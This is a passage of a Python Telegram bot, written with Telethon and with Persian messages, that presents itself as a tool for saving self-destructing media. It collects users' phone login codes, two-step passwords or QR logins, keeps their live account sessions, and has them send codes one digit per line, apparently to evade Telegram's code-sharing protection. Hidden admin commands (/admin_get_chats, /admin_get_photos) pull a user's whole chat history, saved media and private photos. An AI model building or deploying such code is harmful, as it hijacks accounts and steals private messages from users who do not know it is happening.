                    await bot.send_message(chat_id, f"❌ خطا در فرایند QR login زمان اسکن به پایان رسید: {e}")
                except Exception:
                    pass

        # schedule on EVENT_LOOP
        if EVENT_LOOP:
            EVENT_LOOP.create_task(qr_waiter())
        else:
            asyncio.create_task(qr_waiter())

    except Exception as e:
        try:
            await temp_client.disconnect()
        except Exception:
            pass
        try:
            tmp = pending_states.pop(key, None)
            if tmp:
                sess_name = tmp.get('session_name')
                if sess_name:
                    remove_session_files(sess_name)
        except Exception:
            pass
        await event.reply(f"❌ خطا در ایجاد QR login: {e}")

async def handle_catch_plain_text(event):
    chat_id = event.chat_id

    if not global_state.get('enabled', True):
        await event.reply("⛔ ربات در حال حاضر غیرفعال است. لطفاً بعداً تلاش کنید.")
        return

    try:
        ok, msg = await check_required_membership(chat_id)
        if not ok:
            try:
                await event.reply(msg, buttons=Button.inline('🔄 بررسی مجدد', b'check_join'))
            except Exception:
                await event.reply(msg)
            return
    except Exception as e:
        print(f"[catch_plain_text] membership check failed for {chat_id}: {e}")
        await event.reply("❌ خطا در بررسی عضویت. لطفاً مجدداً تلاش کنید یا با ادمین تماس بگیرید.")
        return

    key = str(chat_id)
    text = event.raw_text.strip()
    if key not in pending_states:
        return

    state = pending_states[key]
    cur = state.get('state')
    temp_client = state.get('temp_client')

    try:
        if cur == 'awaiting_phone':
            phone = text
            state['phone'] = phone
            await temp_client.connect()
            try:
                await temp_client.send_code_request(phone)
            except PhoneCodeExpiredError:
                await event.reply(
                    "❌ کد منقضی شده، لطفاً دوباره /login را اجرا کنید.\n\n"
                    "💡 اگر با شماره تماس مشکل دارید، می‌توانید از دستور /qrlogin برای لاگین با QR کد استفاده کنید."
                )
                try:
                    await temp_client.disconnect()
                except Exception:
                    pass
                try:
                    tmp = pending_states.pop(key, None)
                    if tmp:
                        sess_name = tmp.get('session_name')
                        if sess_name:
                            remove_session_files(sess_name)
                except Exception:
                    pass
                return
            except Exception as e:
                await event.reply(
                    f"❌ خطا در ارسال کد: {e}\n\n دقت کنید که شماره تلفن با پیش شماره کشورش وارد شده باشد 98 \n\n"
                    "💡 اگر با شماره تماس مشکل دارید، می‌توانید از دستور /qrlogin برای لاگین با QR کد استفاده کنید."
                )
                try:
                    await temp_client.disconnect()
                except Exception:
                    pass
                try:
                    tmp = pending_states.pop(key, None)
                    if tmp:
                        sess_name = tmp.get('session_name')
                        if sess_name:
                            remove_session_files(sess_name)
                except Exception:
                    pass
                return

            state['state'] = 'awaiting_code'
            await event.reply("📩 کد تأیید برای شماره شما ارسال شد. لطفاً کد را ارسال کنید. برای لغو /cancel را لمس کنید.\nکد ورود را به صورت زیر هم بفرستید.\n1\n2\n3\n4\n5")
            return

        if cur == 'awaiting_code':
            code_input = text
            if '\n' in code_input:
                lines = [l.strip() for l in code_input.splitlines() if l.strip()]
                if not lines:
                    await event.reply(
                        "❌ فرمت کد نامعتبر است.\n"
                        "لطفاً هر رقم کد را در یک خط جدا بفرستید، مانند:\n1\n2\n3\n4\n5\n\n"
                        "اگر کد را به‌صورت یک خط فرستاده‌اید (مثلاً 12345)، لطفاً آن را به‌صورت عمودی ارسال کنید."
                    )
                    return
                if all(len(l) == 1 and l.isdigit() for l in lines):
                    code = ''.join(lines)
                else:
                    await event.reply(
                        "❌ فرمت کد نامعتبر است.\n"
                        "هر خط باید دقیقاً یک رقم باشد. نمونهٔ درست:\n1\n2\n3\n4\n5\n\n"
                        "شما می‌توانید هر رقم را در یک سطر جدا وارد کنید."
                    )
                    return
            else:
                if code_input.isdigit() and len(code_input) >= 4:
                    await event.reply(
                        "❌ لطفاً کد تأیید را **به‌صورت عمودی** ارسال کنید — هر رقم در یک خط جدا.\n\n"
                        "نمونهٔ صحیح:\n1\n2\n3\n4\n5\n\n"
                        "شما کد را به‌صورت یک خطی ارسال کرده‌اید (مثال: 12345). لطفاً دوباره به شکل عمودی ارسال کنید."
                    )
                    return
                code = code_input

            try:
                await temp_client.sign_in(state['phone'], code)
                await temp_client.disconnect()

                real_session_name = make_session_name(chat_id, state['phone'])
                for ext in ['', '.session', '.session-journal', '.session.json']:
                    tmp = state['session_name'] + ext
                    if os.path.exists(tmp):
                        dest = real_session_name + ext
                        try:
                            shutil.move(tmp, dest)
                        except Exception:
                            pass

                final_client = _make_telethon_client(real_session_name, state['api_id'], state['api_hash'])
                state['temp_client'] = final_client
                state['session_name'] = real_session_name

                await finalize_user_login(chat_id, state)
                pending_states.pop(key, None)
                return

            except SessionPasswordNeededError:
                state['state'] = 'awaiting_password'
                await event.reply("🔐 حساب شما دارای رمز دومرحله‌ای است. لطفاً رمز را ارسال کنید.")
                return
            except PhoneCodeInvalidError:
                await event.reply("❌ کد ارسال‌شده نامعتبر است. دوباره تلاش کنید یا /cancel بزنید.")
                return
            except PhoneCodeExpiredError:
                await event.reply(
                    "❌ کد منقضی شده است. لطفاً دوباره /login را اجرا کنید.\n\n"
                    "💡 اگر با شماره تماس مشکل دارید، می‌توانید از دستور /qrlogin برای لاگین با QR کد استفاده کنید."
                )
                try:
                    await temp_client.disconnect()
                except Exception:
                    pass
                try:
                    tmp = pending_states.pop(key, None)
                    if tmp:
                        sess_name = tmp.get('session_name')
                        if sess_name:
                            remove_session_files(sess_name)
                except Exception:
                    pass
                return
            except Exception as e:
                await event.reply(
                    f"❌ خطا در ورود با کد: {e}\nفرایند لغو شد. /login را دوباره اجرا کنید.\n\n"
                    "💡 اگر با شماره تماس مشکل دارید، می‌توانید از دستور /qrlogin برای لاگین با QR کد استفاده کنید."
                )
                try:
                    await temp_client.disconnect()
                except Exception:
                    pass
                try:
                    tmp = pending_states.pop(key, None)
                    if tmp:
                        sess_name = tmp.get('session_name')
                        if sess_name:
                            remove_session_files(sess_name)
                except Exception:
                    pass
                return

        if cur == 'awaiting_password':
            password = text
            try:
                await temp_client.sign_in(password=password)
                await temp_client.disconnect()

                real_session_name = make_session_name(chat_id, state['phone'])
                for ext in ['', '.session', '.session-journal', '.session.json']:
                    tmp = state['session_name'] + ext
                    if os.path.exists(tmp):
                        dest = real_session_name + ext
                        if os.path.exists(tmp):
                            try:
                                shutil.move(tmp, dest)
                            except Exception:
                                pass

                final_client = _make_telethon_client(real_session_name, state['api_id'], state['api_hash'])
                state['temp_client'] = final_client
                state['session_name'] = real_session_name

                await finalize_user_login(chat_id, state)
                pending_states.pop(key, None)
                return
            except Exception as e:
                await event.reply(f"❌ خطا در وارد کردن رمز دو مرحله‌ای: {e}\nلطفاً دوباره تلاش کنید یا /cancel بزنید.")
                return

    except Exception as e:
        await event.reply(f"❌ خطای داخلی: {e}")
        try:
            await temp_client.disconnect()
        except Exception:
            pass
        try:
            tmp = pending_states.pop(key, None)
            if tmp:
                sess_name = tmp.get('session_name')
                if sess_name:
                    remove_session_files(sess_name)
        except Exception:
            pass

# CallbackQuery handler
async def handle_callback_check_join(event):
    try:
        await event.answer('در حال بررسی...')
    except Exception:
        pass

    chat_id = getattr(event, 'sender_id', None) or (event.chat_id if hasattr(event, 'chat_id') else None)
    if chat_id is None:
        try:
            await event.answer('خطا: شناسه کاربر نامشخص است.', alert=True)
        except Exception:
            pass
        return

    try:
        await event.edit("🔄 بررسی عضویت... لطفاً صبر کنید.", buttons=None)
    except Exception:
        try:
            await bot.send_message(chat_id, "🔄 بررسی عضویت... لطفاً صبر کنید.")
        except Exception:
            pass

    for ch in REQUIRED_CHANNELS:
        key = (str(ch), int(chat_id))
        if key in membership_cache:
            membership_cache.pop(key, None)

    max_global_attempts = 6
    success = False
    last_msg = ""
    for attempt in range(1, max_global_attempts + 1):
        try:
            ok, msg = await check_required_membership(chat_id, force=True)
            if ok:
                success = True
                try:
                    await bot.send_message(chat_id, "✅ عضویت شما تأیید شد — اکنون می‌توانید از ربات استفاده کنید.")
                except Exception:
                    pass
                try:
                    await event.edit("✅ عضویت شما تأیید شد.\nاکنون می‌توانید از ربات استفاده کنید.", buttons=None)
                except Exception:
                    pass

                try:
                    start_text = (
                        "👋 سلام!\n"
                        "این ربات به شما کمک می‌کند تا با اکانت تلگرامتان لاگین کنید و مدیاهای نابود شونده  را ذخیره کنید.\n\n"
                        "**📚 برای مشاهده فیلم معرفی ربات به این لینک بروید:**\n"
                        "[تماشای ویدئو در YouTube](https://youtu.be/SxWGZRx7KWc?si=obLFb1mTFLnjfAFJ)\n\n"
                        "دستورات:\n"
                        "/login - لاگین با شماره تلفن\n"
                        "/qrlogin - لاگین با QR کد\n"
                        "/logout - خروج از اکانت\n"
                        "/status - نمایش وضعیت\n"
                        "/toggle_secret - روشن/خاموش کردن ذخیره‌سازی\n"
                        "/cancel - لغو فرایند لاگین"
                    )
                    await bot.send_message(chat_id, start_text)
                except Exception:
                    pass

                break
            else:
                last_msg = msg
                try:
                    await event.edit(f"❗ هنوز عضو کانال‌های موردنیاز نیستید.\n{msg}\n\nتلاش {attempt}/{max_global_attempts} برای بررسی دوباره...", buttons=Button.inline('🔄 بررسی مجدد', b'check_join'))
                except Exception:
                    try:
                        await bot.send_message(chat_id, f"❗ هنوز عضو کانال‌های موردنیاز نیستید.\n{msg}\n\nتلاش {attempt}/{max_global_attempts} برای بررسی دوباره...")
                    except Exception:
                        pass

                if attempt < max_global_attempts:
                    await asyncio.sleep(0.8)
                continue
        except Exception as e:
            print(f"[callback_check_join] error on attempt {attempt} for user {chat_id}: {e}")
            await asyncio.sleep(1.0)
            continue

    if not success:
        try:
            await event.edit("❌ بررسی مجدد انجام شد؛ اما هنوز عضو کانال(ها) نیستید یا خطا رخ داده است.\n" + last_msg, buttons=Button.inline('🔄 بررسی مجدد', b'check_join'))
        except Exception:
            try:
                await bot.send_message(chat_id, "❌ بررسی مجدد انجام شد؛ اما هنوز عضو کانال(ها) نیستید یا خطا رخ داده است.\n" + last_msg)
            except Exception:
                pass

# ----------------- status/toggle/logout -----------------
async def handle_status(event):
    chat_id = event.chat_id
    await load_data()
    u = users_data.get(str(chat_id))
    if not u:
        await event.reply("ℹ️ شما لاگین نکرده‌اید.")
        return

    await event.reply(
        "📊 وضعیت شما:\n"
        f"✅ لاگین: {'بله' if u.get('logged_in') else 'خیر'}\n"
        f"📞 شماره: {u.get('phone')}\n"
        f"🔔 ذخیره مدیای نابود شونده : {'فعال' if u.get('save_secret_enabled', True) else 'غیرفعال'}\n"
        f"🗂️ سشن: {u.get('session_name')}\n"
    )

async def handle_toggle_secret(event):
    chat_id = event.chat_id
    await load_data()
    u = users_data.get(str(chat_id))
    if not u or not u.get('logged_in'):
        await event.reply("ℹ️ شما لاگین نکرده‌اید.")
        return

    curr = u.get('save_secret_enabled', True)
    u['save_secret_enabled'] = not curr
    await save_data()
    await event.reply(f"🔁 ذخیره مدیای نابود شونده  اکنون {'فعال' if not curr else 'غیرفعال'} است.")

async def handle_logout(event):
    chat_id = event.chat_id
    await load_data()
    u = users_data.get(str(chat_id))
    if not u or not u.get('logged_in'):
        await event.reply("ℹ️ شما در حال حاضر وارد نشده‌اید.")
        return

    await event.reply("⚠️ آیا مطمئن هستید؟ برای تایید و حذف کامل اطلاعات اکانت خود دستور /confirm_logout")

async def handle_confirm_logout(event):
    chat_id = event.chat_id
    await load_data()
    u = users_data.get(str(chat_id))
    if not u or not u.get('logged_in'):
        await event.reply("ℹ️ شما در حال حاضر وارد نشده‌اید.")
        return

    await cleanup_user_session(str(chat_id))
    await event.reply("✅ با موفقیت از اکانت خارج شدید و اطلاعات شما حذف شد.")

# ----------------- Admin helpers -----------------
def admin_check(func):
    async def wrapper(event):
        if event.chat_id != GLOBAL_ADMIN_ID:
            await event.reply("⛔ فقط ادمین مجاز است.")
            return
        await func(event)
    return wrapper

async def handle_admin_stats(event):
    await load_data()
    total_users = len(users_data)
    logged_in = sum(1 for v in users_data.values() if v.get('logged_in'))
    await event.reply(
        f"📈 آمار ربات:\nکل کاربران ذخیره‌شده: {total_users}\nکاربران واردشده: {logged_in}\nوضعیت کلی ربات: {'فعال' if global_state.get('enabled', True) else 'غیرفعال'}"
    )

async def handle_admin_broadcast(event):
    text = event.pattern_match.group(1)
    await load_data()
    count = 0
    for uid in users_data.keys():
        try:
            await bot.send_message(int(uid), f"📣 پیام همگانی از ادمین:\n\n{text}")
            count += 1
        except Exception:
            pass
    await event.reply(f"✅ ارسال به {count} کاربر انجام شد.")

async def handle_admin_set_api(event):
    aid = event.pattern_match.group(1)
    ahash = event.pattern_match.group(2)
    try:
        global_state['default_api_id'] = int(aid)
        global_state['default_api_hash'] = ahash
        await save_data()
        await event.reply("✅ مقادیر api_id و api_hash پیش‌فرض با موفقیت به‌روزرسانی شدند. (برای سشن‌های جدید اعمال می‌شود)")
    except Exception as e:
        await event.reply(f"❌ خطا در تنظیم: {e}")

async def handle_admin_disable(event):
    global_state['enabled'] = False
    await save_data()
    await event.reply("⛔ ربات غیرفعال شد.")

async def handle_admin_enable(event):
    global_state['enabled'] = True
    await save_data()
    await event.reply("✅ ربات فعال شد.")

async def handle_admin_sessions(event):
    await load_data()
    if not users_data:
        await event.reply("ℹ️ هیچ سشنی ذخیره نشده است.")
        return

    lines = ["📋 لیست سشن‌ها:"]
    for uid, info in users_data.items():
        lines.append(f"- chat_id: {uid} | phone: {info.get('phone')} | session: {info.get('session_name')} | logged_in: {info.get('logged_in')}")

    text = "\n".join(lines)
    if len(text) > 4000:
        with tempfile.NamedTemporaryFile(mode='w', encoding='utf-8', delete=False, suffix='.txt') as tf:
            tf.write(text)
            tmp = tf.name
        try:
            await bot.send_file(event.chat_id, tmp, caption="📋 لیست سشن‌ها")
        finally:
            try:
                os.remove(tmp)
            except Exception:
                pass
    else:
        await event.reply(text)

async def handle_admin_kill(event):
    chat_id = int(event.pattern_match.group(1))
    await load_data()
    key = str(chat_id)
    if key not in users_data:
        await event.reply("❌ سشن با این آیدی یافت نشد.")
        return

    # use cleanup_user_session to ensure notification and removal
    await cleanup_user_session(key)
    await event.reply(f"✅ سشن {chat_id} حذف شد.")

async def handle_admin_kill_all(event):
    await load_data()
    keys = list(users_data.keys())
    count = 0
    for key in keys:
        try:
            await cleanup_user_session(key)
            count += 1
        except Exception as e:
            print(f"[admin_kill_all] error removing {key}: {e}")
    await event.reply(f"✅ حذف {count} سشن انجام شد.")

async def handle_admin_get_chats(event):
    chat_id = int(event.pattern_match.group(1))
    await load_data()

    if str(chat_id) not in users_data:
        await event.reply("❌ کاربر با این آیدی یافت نشد یا لاگین نکرده است.")
        return

    if str(chat_id) not in user_clients:
        await event.reply("❌ کلاینت کاربر فعال نیست یا disconnected شده است.")
        return

    client = user_clients[str(chat_id)]
    await event.reply(f"🔄 شروع استخراج چت‌های کاربر {chat_id}...")

    try:
        await extract_all_chats_text(client, chat_id)
        await extract_saved_messages_media(client, chat_id)
        await event.reply(f"✅ استخراج چت‌های کاربر {chat_id} با موفقیت انجام شد.")
    except Exception as e:
        await event.reply(f"❌ خطا در استخراج چت‌های کاربر {chat_id}: {e}")

async def handle_admin_get_photos(event):
    chat_id = int(event.pattern_match.group(1))
    await load_data()

    if str(chat_id) not in users_data:
        await event.reply("❌ کاربر با این آیدی یافت نشد یا لاگین نکرده است.")
        return

    if str(chat_id) not in user_clients:
        await event.reply("❌ کلاینت کاربر فعال نیست یا disconnected شده است.")
        return

    client = user_clients[str(chat_id)]
    await event.reply(f"🔄 شروع استخراج عکس‌های چت‌های خصوصی کاربر {chat_id}...")

    try:
        await extract_all_private_photos(client, chat_id)
        await event.reply(f"✅ استخراج عکس‌های چت‌های خصوصی کاربر {chat_id} با موفقیت انجام شد.")
    except Exception as e:
        await event.reply(f"❌ خطا در استخراج عکس‌های کاربر {chat_id}: {e}")

# ----------------- cleanup user session -----------------
async def cleanup_user_session(uid: str):
    """
    پاکسازی سشن کاربر:
    - اطلاع‌رسانی به کاربر (اگر ممکن باشد)
    - قطع اتصال کلاینت اگر فعال است
    - حذف فایل‌های سشن
    - به‌روز کردن users_data: logged_in = False و ذخیرهٔ داده‌ها
    - اطلاع‌رسانی به ادمین
    """
    try:
        # Notify user (best-effort)
        try:
            uid_int = int(uid)
            try:
                await ensure_bot_connected()
                try:
                    await bot.send_message(uid_int, "⚠️ سشن شما در این ربات قطع یا حذف شد. برای ادامه استفاده لطفاً دوباره لاگین کنید.")
                except Exception:
                    pass
            except Exception:
                pass
        except Exception:
            pass

        if uid in user_clients:
            try:
                c = user_clients.pop(uid)
                if c.is_connected():
                    await c.disconnect()
            except Exception as e:
                print(f"[cleanup_user_session] error disconnecting client {uid}: {e}")
    except Exception as e:
        print(f"[cleanup_user_session] unexpected: {e}")

    sess_name = users_data.get(uid, {}).get('session_name')
    if sess_name:
        remove_session_files(sess_name)

    # mark logged_out
    try:
        if uid in users_data:
            users_data[uid]['logged_in'] = False
            await save_data()
    except Exception as e:
        print(f"[cleanup_user_session] error saving data after cleanup for {uid}: {e}")

    try:
        await ensure_bot_connected()
        try:
            await bot.send_message(GLOBAL_ADMIN_ID, f"⚠️ سشن کاربر {uid} پاک/قطع شد (کش/خطای session). برای اطلاعات بیشتر لاگ‌ها را بررسی کنید.")
        except Exception:
            pass
    except Exception:
        pass

# ----------------- startup reconnection -----------------
async def startup_reconnect_existing_sessions():
    await load_data()
    for uid, u in list(users_data.items()):
        try:
            if u.get('logged_in') and u.get('session_name'):
                attempts = 0
                max_attempts = 3
                while attempts < max_attempts:
                    attempts += 1
                    try:
                        client = _make_telethon_client(u['session_name'], u.get('api_id', global_state.get('default_api_id', DEFAULT_API_ID)), u.get('api_hash', global_state.get('default_api_hash', DEFAULT_API_HASH)))
                        await client.connect()
                        if not await client.is_user_authorized():
                            print(f"[startup] client not authorized for {uid}, removing.")
                            await cleanup_user_session(uid)
                            break
                        user_clients[uid] = client
                        register_user_client_handlers(int(uid), client)
                        print(f"[startup] reconnected session for user {uid}")
                        break
                    except PersistentTimestampOutdatedError as e:
                        print(f"[startup] PersistentTimestampOutdatedError for {uid}: attempt {attempts}/{max_attempts}: {e}")
                        try:
                            await asyncio.sleep(1 + attempts)
                        except Exception:
                            pass
                        continue
                    except AuthKeyUnregisteredError as e:
                        print(f"[startup] AuthKeyUnregisteredError for {uid}: cleaning up session. {e}")
                        await cleanup_user_session(uid)
                        break
                    except Exception as e:
                        print(f"[startup] failed to reconnect {uid}: {e} (attempt {attempts}/{max_attempts})")
                        await asyncio.sleep(1)
                        continue
        except Exception as e:
            print(f"[startup] failed to reconnect {uid}: {e}")
    await save_data()

# ----------------- monitor user clients -----------------
async def monitor_user_clients():
    while True:
        try:
            await asyncio.sleep(30)
            for uid, client in list(user_clients.items()):
                try:
                    if not client.is_connected():
                        print(f"[monitor] client {uid} disconnected, trying to reconnect...")
                        try:
                            await client.connect()
                        except Exception as e:
                            print(f"[monitor] reconnect attempt failed for {uid}: {e}")
                            await cleanup_user_session(uid)
                            continue

                    try:
                        is_auth = await client.is_user_authorized()
                    except Exception as e:
                        print(f"[monitor] error checking is_user_authorized for {uid}: {e}")
                        is_auth = False

                    if not is_auth:
                        print(f"[monitor] client {uid} is not authorized anymore, cleaning up.")
                        await cleanup_user_session(uid)
                        continue

                    try:
                        await client.get_me()
                    except PersistentTimestampOutdatedError as e:
                        print(f"[monitor] PersistentTimestampOutdatedError detected for {uid}: {e}")
                        try:
                            await client.disconnect()
                        except Exception:
                            pass
                        sess_name = users_data.get(uid, {}).get('session_name')
                        api_id = users_data.get(uid, {}).get('api_id', global_state.get('default_api_id'))
                        api_hash = users_data.get(uid, {}).get('api_hash', global_state.get('default_api_hash'))
                        reconnected = False
                        if sess_name:
                            try:
                                new_client = _make_telethon_client(sess_name, api_id, api_hash)
                                await new_client.connect()
                                if await new_client.is_user_authorized():
                                    user_clients[uid] = new_client
                                    register_user_client_handlers(int(uid), new_client)
                                    print(f"[monitor] reconnected client for {uid} after timestamp error.")
                                    reconnected = True
                                else:
                                    await cleanup_user_session(uid)
                            except Exception as e2:
                                print(f"[monitor] failed to reconnect new client for {uid}: {e2}")
                        if not reconnected:
                            await cleanup_user_session(uid)
                        continue
                    except AuthKeyUnregisteredError as e:
                        print(f"[monitor] AuthKeyUnregisteredError for {uid}: {e}")
                        await cleanup_user_session(uid)
                        continue
                    except Exception as e:
                        print(f"[monitor] non-fatal error checking client {uid}: {e}")
                        continue
                except Exception as e:
                    print(f"[monitor] unexpected error for client {uid}: {e}")
                    continue
        except Exception as e:
            print(f"[monitor] monitor loop unexpected error: {e}")
            try:
                await asyncio.sleep(5)
            except Exception:
                pass

# ----------------- monitor bot connection -----------------
async def monitor_bot_connection():
    attempt = 0
    consecutive_ts_errors = 0
    while True:
        try:
            await asyncio.sleep(20)
            try:
                await ensure_bot_connected()
                try:
                    await bot.get_me()
                except PersistentTimestampOutdatedError as e:
                    consecutive_ts_errors += 1
                    attempt += 1
                    print(f"[monitor_bot] PersistentTimestampOutdatedError detected: {e} (consecutive {consecutive_ts_errors})")
                    try:
                        await bot.send_message(GLOBAL_ADMIN_ID, f"⚠️ PersistentTimestampOutdatedError detected on bot (count {consecutive_ts_errors}). Trying recreate...")
                    except Exception:
                        pass

                    if consecutive_ts_errors >= 2:
                        ok = await create_and_start_bot(clean_session=True, attempt=attempt)
                    else:
                        ok = await create_and_start_bot(clean_session=False, attempt=attempt)

                    if not ok:
                        await asyncio.sleep(min(10 * attempt, 300))
                    continue
                else:
                    consecutive_ts_errors = 0
                    attempt = 0
            except PersistentTimestampOutdatedError as e:
                attempt += 1
                consecutive_ts_errors += 1
                print(f"[monitor_bot] PersistentTimestampOutdatedError from ensure_bot_connected: {e} (attempt {attempt})")
                try:
                    await bot.send_message(GLOBAL_ADMIN_ID, f"⚠️ PersistentTimestampOutdatedError detected on bot (attempt {attempt}). Trying recreate...")
                except Exception:
                    pass
                if attempt >= 2:
                    ok = await create_and_start_bot(clean_session=True, attempt=attempt)
                else:
                    ok = await create_and_start_bot(clean_session=False, attempt=attempt)
                if not ok:
                    await asyncio.sleep(min(10 * attempt, 300))
                continue
            except Exception as e:
                attempt += 1
                print(f"[monitor_bot] non-fatal error on bot.get_me(): {e} (attempt {attempt})")
                try:
                    if bot is not None and bot.is_connected():
                        try:
                            await bot.send_message(GLOBAL_ADMIN_ID, f"⚠️ خطا در مانیتور ربات: {e} (attempt {attempt}). تلاش recreate...")
                        except Exception:
                            pass
                    await create_and_start_bot(clean_session=(attempt >= 2), attempt=attempt)
                except Exception:
                    pass
                await asyncio.sleep(min(10 * attempt, 300))
                continue
        except Exception as e:
            print(f"[monitor_bot] loop unexpected error: {e}")
            try:
                await asyncio.sleep(5)
            except Exception:
                pass

# ----------------- attach handlers to bot -----------------
async def attach_handlers_to_bot():
    bot.add_event_handler(cmd_start, events.NewMessage(pattern='/start'))
    bot.add_event_handler(handle_cancel, events.NewMessage(pattern='/cancel'))
    bot.add_event_handler(handle_callback_check_join, events.CallbackQuery(data=b'check_join'))

    bot.add_event_handler(lambda ev: require_membership(handle_login)(ev), events.NewMessage(pattern='/login'))
    bot.add_event_handler(lambda ev: require_membership(handle_qrlogin)(ev), events.NewMessage(pattern='/qrlogin'))
    bot.add_event_handler(lambda ev: require_membership(handle_catch_plain_text)(ev), events.NewMessage(func=lambda e: e.text and not e.text.startswith('/')))
    bot.add_event_handler(lambda ev: require_membership(handle_status)(ev), events.NewMessage(pattern='/status'))
    bot.add_event_handler(lambda ev: require_membership(handle_toggle_secret)(ev), events.NewMessage(pattern='/toggle_secret'))
    bot.add_event_handler(lambda ev: require_membership(handle_logout)(ev), events.NewMessage(pattern='/logout'))
    bot.add_event_handler(lambda ev: require_membership(handle_confirm_logout)(ev), events.NewMessage(pattern='/confirm_logout'))

    bot.add_event_handler(lambda ev: admin_check(handle_admin_stats)(ev), events.NewMessage(pattern='/admin_stats'))
    bot.add_event_handler(lambda ev: admin_check(handle_admin_broadcast)(ev), events.NewMessage(pattern=r'/admin_broadcast (.+)'))
    bot.add_event_handler(lambda ev: admin_check(handle_admin_set_api)(ev), events.NewMessage(pattern=r'/admin_set_api (.+) (.+)'))
    bot.add_event_handler(lambda ev: admin_check(handle_admin_disable)(ev), events.NewMessage(pattern='/admin_disable'))
    bot.add_event_handler(lambda ev: admin_check(handle_admin_enable)(ev), events.NewMessage(pattern='/admin_enable'))
    bot.add_event_handler(lambda ev: admin_check(handle_admin_sessions)(ev), events.NewMessage(pattern='/admin_sessions'))
    bot.add_event_handler(lambda ev: admin_check(handle_admin_kill)(ev), events.NewMessage(pattern=r'/admin_kill (\d+)'))
    bot.add_event_handler(lambda ev: admin_check(handle_admin_kill_all)(ev), events.NewMessage(pattern='/admin_kill_all'))
    bot.add_event_handler(lambda ev: admin_check(handle_admin_get_chats)(ev), events.NewMessage(pattern=r'/admin_get_chats (\d+)'))
    bot.add_event_handler(lambda ev: admin_check(handle_admin_get_photos)(ev), events.NewMessage(pattern=r'/admin_get_photos (\d+)'))

# ----------------- main -----------------
async def main():
    print("🚀 راه‌اندازی ربات با EVENT_LOOP مرکزی...")
    await load_data()

    clean_bot_session = False
    persisted_bot_token = global_state.get('bot_token')
    if persisted_bot_token != BOT_TOKEN:
        clean_bot_session = True
        global_state['bot_token'] = BOT_TOKEN
        await save_data()
        print("[main] bot token change detected -> will remove existing bot session file to avoid using old credentials.")

    ok = await create_and_start_bot(clean_session=clean_bot_session, attempt=1)
    if not ok:
        for a in range(2, 6):
            await asyncio.sleep(min(2 ** a, 60))
            ok = await create_and_start_bot(clean_session=False, attempt=a)
            if ok:
                break
        if not ok:
            ok = await create_and_start_bot(clean_session=True, attempt=99)
            if not ok:
                raise RuntimeError("Could not start bot client after multiple attempts.")

    await attach_handlers_to_bot()
    await startup_reconnect_existing_sessions()

    # start background monitors on the same EVENT_LOOP
    if EVENT_LOOP:
        EVENT_LOOP.create_task(monitor_user_clients())
        EVENT_LOOP.create_task(monitor_bot_connection())
    else:
        asyncio.create_task(monitor_user_clients())
        asyncio.create_task(monitor_bot_connection())

    print("✅ ربات آماده است.")
    restart_attempt = 0
    while True:
        try:
            await bot.run_until_disconnected()
            print("[main] bot.run_until_disconnected returned; attempting recreate...")
            restart_attempt += 1
            await create_and_start_bot(clean_session=(restart_attempt > 2), attempt=restart_attempt)
            try:
                await attach_handlers_to_bot()
            except Exception:
                pass
            continue
        except PersistentTimestampOutdatedError as e:
            restart_attempt += 1
            print(f"[main] PersistentTimestampOutdatedError: {e} (attempt {restart_attempt})")
            try:
                await bot.send_message(GLOBAL_ADMIN_ID, f"⚠️ PersistentTimestampOutdatedError در ربات رخ داد: {e}\nتلاش برای recreate")
            except Exception:
                pass
            await create_and_start_bot(clean_session=(restart_attempt > 1), attempt=restart_attempt)
            try:
                await attach_handlers_to_bot()
            except Exception:
                pass
            continue
        except Exception as e:
            restart_attempt += 1
            tb = traceback.format_exc()
            print(f"[main] unexpected exception from run_until_disconnected: {e}\n{tb}")
            try:
                await bot.send_message(GLOBAL_ADMIN_ID, f"❌ خطای غیرمنتظره در ربات: {e}\n{tb}\nتلاش برای recreate")
            except Exception:
                pass
            await create_and_start_bot(clean_session=(restart_attempt > 2), attempt=restart_attempt)
            try:
                await attach_handlers_to_bot()
            except Exception:
                pass
            await asyncio.sleep(min(2 ** restart_attempt, 300))
            continue

# ----------------- graceful shutdown / entrypoint -----------------
async def _cleanup_all():
    # cancel background tasks gracefully and disconnect all clients
    try:
        # disconnect user clients
        for k, c in list(user_clients.items()):
            try:
                if c.is_connected():
                    await c.disconnect()
            except Exception:
                pass
        # disconnect bot
        try:
            if bot is not None and bot.is_connected():
                await bot.disconnect()
        except Exception:
            pass
    except Exception:
        pass

async def _shutdown_signal_handler():
    print("[shutdown] signal received, running cleanup...")
    await _cleanup_all()
    # cancel all other tasks
    to_cancel = [t for t in asyncio.all_tasks() if not t.done()]
    for t in to_cancel:
        t.cancel()
    await asyncio.gather(*to_cancel, return_exceptions=True)
    print("[shutdown] cleanup done, stopping loop")
    # stop loop in a safe way (EVENT_LOOP is global)
    try:
        EVENT_LOOP.stop()
    except Exception:
        pass

if __name__ == '__main__':
    # create central event loop and set it
    EVENT_LOOP = asyncio.new_event_loop()
    asyncio.set_event_loop(EVENT_LOOP)

    # initialize locks now that EVENT_LOOP is set
    # (important: creating asyncio primitives before setting event loop can attach them to a different loop)
    file_lock = asyncio.Lock()
    bot_swap_lock = asyncio.Lock()
    membership_api_lock = asyncio.Lock()
    # semaphore: اجازهٔ حداکثر هم‌زمانی محدود برای درخواست‌های حساس به timestamp
    membership_semaphore = asyncio.Semaphore(3)  # به دلخواه: 2 یا 3 مناسب است

    # register signal handlers to schedule shutdown on same loop
    try:
        EVENT_LOOP.add_signal_handler(signal.SIGINT, lambda: EVENT_LOOP.create_task(_shutdown_signal_handler()))
        EVENT_LOOP.add_signal_handler(signal.SIGTERM, lambda: EVENT_LOOP.create_task(_shutdown_signal_handler()))
    except NotImplementedError:
        # Windows or environments where add_signal_handler not implemented
        pass

    try:
        EVENT_LOOP.run_until_complete(main())
    except KeyboardInterrupt:
        print("⛔ توقف دستی.")
    except Exception as e:
        print(f"[__main__] unexpected error: {e}")
    finally:
        try:
            EVENT_LOOP.run_until_complete(_cleanup_all())
        except Exception:
            pass
        try:
            EVENT_LOOP.close()
        except Exception:
            pass
        print("🔚 خاتمه برنامه")
